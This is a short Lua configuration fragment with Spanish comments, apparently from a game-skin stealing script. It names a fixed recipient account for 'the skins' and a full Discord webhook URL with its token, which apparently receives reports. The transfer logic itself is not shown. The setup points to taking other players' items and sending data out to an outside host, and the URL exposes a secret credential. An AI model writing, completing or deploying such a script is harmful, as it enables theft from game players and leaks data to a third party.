local CONFIG = {
    ...
    TARGET_NAME   = "zlplaga", -- username de la cuenta que recibe las skins
    ...
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1551555616722391050/laEjjJoio9GuO04DknsyjcWwbZzkPzOq_dHiu9kgCAjivgFH1MwKBvck1KF5RtXvv04V", -- "https://discord.com/api/webhooks/" webhook de Discord
